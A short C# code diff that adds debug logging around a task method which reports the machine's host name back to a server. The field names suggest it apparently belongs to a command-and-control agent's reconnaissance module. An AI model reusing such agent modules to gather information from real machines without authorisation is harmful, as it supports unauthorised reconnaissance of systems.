@@ -18,12 +18,14 @@ namespace Workflow
         }
         public async Task Execute(ServerJob job)
         {
+            DebugLog.Log($"Executing {Name} [{job.task.id}]");
             messageManager.AddTaskResponse(new TaskResponse
             {
                 completed = true,
                 user_output = Dns.GetHostName(),
                 task_id = job.task.id,
             });
+            DebugLog.Log($"{Name} completed [{job.task.id}]");
         }
     }
 }
